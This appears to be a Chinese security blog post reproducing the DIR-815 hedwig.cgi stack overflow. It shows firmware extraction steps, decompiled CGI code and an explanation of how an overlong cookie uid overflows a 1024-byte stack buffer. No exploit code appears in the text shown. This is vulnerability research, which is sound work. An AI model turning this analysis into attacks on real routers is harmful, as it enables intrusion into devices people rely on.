<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Thir0th"><meta name="copyright" content="Thir0th"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>DIR-815漏洞复现 | Thir0th's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"www.thir0th.xyz","root":"/","title":"且行且忘且随风","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="DIR-815漏洞复现">
<meta property="og:type" content="article">
<meta property="og:title" content="DIR-815漏洞复现">
<meta property="og:url" content="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Thir0th&#39;s Blog">
<meta property="og:description" content="DIR-815漏洞复现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/dL5cTaJPbD1s6SI.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/fFZXYv2eVouAKOB.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/gSOcRiX7GE9Ptwy.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/hxsnNQ3CGOiJa65.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/M46GJC5ljxdwPum.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/JklKctPDY9o316X.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/7JuhMRvec3nsLOq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/9EP8C5nbxw1kN2s.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/mdaJZQGRfqxINB5.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Dw9IW2u7yEFzphx.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Fz97VW3J2osjtch.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OR49Ba82KVeoWk1.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/iTPwgZ4tdMxH6Uq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OtCNcwfEqjxevDS.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OaSB1Aeinbys27d.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/6NthXGRgPoWkmq1.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/jXNTEeFgmsRuVq3.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/tQCJhLwnicBfbMV.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/N8qlbJ4EGxBaOjW.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/p15ULvBMFEmdVwJ.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/yPhiwu59nTZzDIq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/bWHFCARkmw8GtMh.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/e8sy2A41lq5aMwK.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/njFp7cTJSz1YeVE.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Pk1n74aKVmFojlc.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/owAgE8zf9BLMKqn.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/KJo8Azvmh6uCiwR.png">
<meta property="article:published_time" content="2025-06-25T13:27:35.000Z">
<meta property="article:modified_time" content="2025-06-25T13:28:56.897Z">
<meta property="article:author" content="Thir0th">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Thir0th"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Thir0th"><span class="site-author-status" title="人生如戏">🧐</span></a><div class="site-author-name"><a href="/about/">Thir0th</a></div><span class="site-name">Thir0th's Blog</span><sub class="site-subtitle"></sub><div class="site-description">且行且忘且随风</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">DIR-815漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">固件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%94%A8%E6%88%B7%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.</span> <span class="toc-text">qemu用户态模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5gdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">直接gdb调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">脚本调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%B3%BB%E7%BB%9F%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.4.</span> <span class="toc-text">qemu系统态模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1-%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E5%86%85%E6%A0%B8-%E9%95%9C%E5%83%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">step1 下载对应内核+镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2-%E5%88%9B%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">step2 创建网桥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3-%E9%85%8D%E7%BD%AEqemu%E7%BD%91%E7%BB%9C"><span class="toc-number">1.4.3.</span> <span class="toc-text">step3 配置qemu网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step4-%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.4.4.</span> <span class="toc-text">step4 远程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">远程调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">远程攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%90%91-QEMU-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E4%BC%A0-payload"><span class="toc-number">1.4.4.2.1.</span> <span class="toc-text">法一：向 QEMU 虚拟机上传 payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87"><span class="toc-number">1.4.4.2.2.</span> <span class="toc-text">法二：向 httpd 服务发送 HTTP 报文</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%80%E5%87%BA%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.</span> <span class="toc-text">退出仿真环境</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Thir0th"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Thir0th's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DIR-815漏洞复现</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-06-25 21:27:35" itemprop="dateCreated datePublished" datetime="2025-06-25T21:27:35+08:00">2025-06-25</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Router/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Router</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/IOT/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">IOT</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><span id="more"></span>

<h1 id="DIR-815漏洞复现"><a href="#DIR-815漏洞复现" class="headerlink" title="DIR-815漏洞复现"></a>DIR-815漏洞复现</h1><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>确定固件架构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">file busybox</span><br></pre></td></tr></table></figure>

<p>binwalk分离固件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me file</span><br></pre></td></tr></table></figure>

<p>mipsrop下载，ida9.0版本</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/XiDPPython/article/details/148194489?spm=1001.2014.3001.5501">IDA插件 MIPSROP的安装和使用方法_ida mips-CSDN博客</a></p>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>官方漏洞批漏：<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625</a></p>
<p><img src="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png" alt="image" loading="lazy"></p>
<p>官方的漏洞报告中只提及了DIR-645型号的hedwig.cgi中会存在缓冲区溢出的漏洞，其实D-Link的DIR-815&#x2F;300&#x2F;600&#x2F;645等型号都存在这个漏洞</p>
<p>根据漏洞描述，可知漏洞点在hedwig.cgi，同时这个文件指向&#x2F;htdocs&#x2F;cgibin，这个就是我们要分析的二进制文件</p>
<p><img src="https://s2.loli.net/2025/06/25/dL5cTaJPbD1s6SI.png" alt="image" loading="lazy"></p>
<p>main中定位主要函数</p>
<p><img src="https://s2.loli.net/2025/06/25/fFZXYv2eVouAKOB.png" alt="image" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">// 函数入口，保存寄存器，分配栈空间，初始化局部变量。</span><br><span class="line">int hedwigcgi_main()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // $v0</span><br><span class="line">  const char *no_REQUEST; // $a1</span><br><span class="line">  FILE *stream; // $s0</span><br><span class="line">  int v3; // $fp</span><br><span class="line">  int v4; // $s5</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  const char *string; // $v0</span><br><span class="line">  FILE *stream_1; // $s2</span><br><span class="line">  int fd; // $v0</span><br><span class="line">  int v9; // $s7</span><br><span class="line">  int fd_1; // $v0</span><br><span class="line">  char **v11; // $s1</span><br><span class="line">  int i; // $s3</span><br><span class="line">  char *v13; // $v0</span><br><span class="line">  const char **v14; // $s1</span><br><span class="line">  int v15; // $s0</span><br><span class="line">  char *v16; // $v0</span><br><span class="line">  const char **v17; // $s1</span><br><span class="line">  int v18; // $s0</span><br><span class="line">  int fd_2; // $v0</span><br><span class="line">  const char *v20; // $v0</span><br><span class="line">  char _runtime_session[20]; // [sp+18h] [-4A8h] BYREF</span><br><span class="line">  char *s_2; // [sp+2Ch] [-494h] BYREF</span><br><span class="line">  char *v24; // [sp+30h] [-490h]</span><br><span class="line">  _DWORD v25[3]; // [sp+34h] [-48Ch] BYREF</span><br><span class="line">  char s_1[128]; // [sp+40h] [-480h] BYREF</span><br><span class="line">  char s[1024]; // [sp+C0h] [-400h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));                      // memset(s, 0, sizeof(s)); 初始化1024字节缓冲区s为0。</span><br><span class="line">  memset(s_1, 0, sizeof(s_1));                  // memset(s_1, 0, sizeof(s_1)); 初始化128字节缓冲区s_1为0。</span><br><span class="line">  strcpy(_runtime_session, &quot;/runtime/session&quot;); // strcpy(_runtime_session, &quot;/runtime/session&quot;); 拷贝字符串到_runtime_session。</span><br><span class="line">  v0 = getenv(&quot;REQUEST_METHOD&quot;);                // v0 = getenv(&quot;REQUEST_METHOD&quot;); 获取环境变量REQUEST_METHOD，判断HTTP请求类型。</span><br><span class="line">  if ( !v0 )                                    // if (!v0) 检查REQUEST_METHOD是否存在，不存在则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no REQUEST&quot;;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = -1;</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcasecmp(v0, &quot;POST&quot;) )                 // if (strcasecmp(v0, &quot;POST&quot;)) 检查是否为POST请求，非POST则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unsupported HTTP request&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, 0, 0x20000); // cgibin_parse_request(sub_409A6C, 0, 0x20000); 解析CGI请求数据。</span><br><span class="line">  stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;);// stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;); 打开签名配置文件。</span><br><span class="line">  if ( !fgets(s_1, 128, stream) )               // if (!fgets(s_1, 128, stream)) 读取签名内容，失败则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to read signature!&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);                               // fclose(stream); 关闭签名文件。</span><br><span class="line">  cgibin_reatwhite(s_1);                        // cgibin_reatwhite(s_1); 去除签名字符串中的空白字符。</span><br><span class="line">  v4 = sobj_new();                              // v4 = sobj_new(); 创建字符串对象v4。</span><br><span class="line">  v5 = sobj_new();                              // v5 = sobj_new(); 创建字符串对象v5。</span><br><span class="line">  v3 = v5;</span><br><span class="line">  if ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to allocate string object&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  sess_get_uid(v4);                             // sess_get_uid(v4); 获取当前会话的UID。</span><br><span class="line">  string = (const char *)sobj_get_string(v4);   // string = (const char *)sobj_get_string(v4); 获取UID字符串。</span><br><span class="line">  sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string);// sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string); 生成postxml路径。</span><br><span class="line">  xmldbc_del(0, 0, s);                          // xmldbc_del(0, 0, s); 删除旧的postxml节点。</span><br><span class="line">  stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;);   // stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;); 创建临时XML文件用于写入。</span><br><span class="line">  if ( !stream_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to open temp file.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !haystack )                              // if (!haystack) 检查XML数据是否存在，不存在则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no xml data.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  fd = fileno(stream_1);                        // fd = fileno(stream_1); 获取文件描述符。</span><br><span class="line">  v9 = lockf(fd, 3, 0);                         // v9 = lockf(fd, 3, 0); 尝试对文件加锁，防止并发写入。</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      0);</span><br><span class="line">    v9 = 0;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  fd_1 = fileno(stream_1);                      // fd_1 = fileno(stream_1); 再次获取文件描述符。</span><br><span class="line">  lockf(fd_1, 1, 0);</span><br><span class="line">  s_2 = s_1;</span><br><span class="line">  v24 = 0;</span><br><span class="line">  memset(v25, 0, sizeof(v25));</span><br><span class="line">  v24 = strtok(_runtime_session, &quot;/&quot;);</span><br><span class="line">  v11 = (char **)v25;</span><br><span class="line">  for ( i = 2; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(0, &quot;/&quot;);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    if ( !v13 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;s_2)[i] = (char *)sobj_get_string(v4);</span><br><span class="line">  fputs(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;, stream_1);</span><br><span class="line">  v14 = (const char **)&amp;s_2;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;%s&gt;\n&quot;, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v15 &lt; i + 1 );</span><br><span class="line">  v16 = strstr(haystack, &quot;&lt;postxml&gt;&quot;);</span><br><span class="line">  fprintf(stream_1, &quot;%s\n&quot;, v16);</span><br><span class="line">  v17 = (const char **)&amp;(&amp;s_2)[i];</span><br><span class="line">  v18 = i + 1;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;/%s&gt;\n&quot;, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v18 &gt; 0 );</span><br><span class="line">  fflush(stream_1);</span><br><span class="line">  xmldbc_read(0, 2, &quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  fd_2 = fileno(stream_1);</span><br><span class="line">  lockf(fd_2, 0, 0);</span><br><span class="line">  fclose(stream_1);</span><br><span class="line">  remove(&quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  v20 = (const char *)sobj_get_string(v4);</span><br><span class="line">  sprintf(s, &quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;, &quot;/runtime/session&quot;, v20);</span><br><span class="line">  xmldbc_ephp(0, 0, s, stdout);</span><br><span class="line">  if ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = 0;</span><br><span class="line">LABEL_25:</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      no_REQUEST);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  if ( haystack )</span><br><span class="line">    free(haystack);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  if ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getenv去检查环境变量，然后全检测是不是post传参</p>
<p><img src="https://s2.loli.net/2025/06/25/gSOcRiX7GE9Ptwy.png" alt="image" loading="lazy"></p>
<p>cgibin_parse_request,函数中获取三个环境变量，这里参数的需要设置，并且有一定的要求</p>
<p><img src="https://s2.loli.net/2025/06/25/hxsnNQ3CGOiJa65.png" alt="image" loading="lazy"></p>
<p>漏洞点就在sess_get_uid中</p>
<p><img src="https://s2.loli.net/2025/06/25/M46GJC5ljxdwPum.png" alt="image" loading="lazy"></p>
<p>获取cookie环境变量，并解析，首先是检查cookie名是否是uid，然后将uid&#x3D;后的ip给v4,而且没有限制，这里就存在栈溢出</p>
<p><img src="https://s2.loli.net/2025/06/25/JklKctPDY9o316X.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/7JuhMRvec3nsLOq.png" alt="image" loading="lazy"></p>
<p>然后是将v4-&gt;string-&gt;s，但s只有0x400字节，然后就会溢出</p>
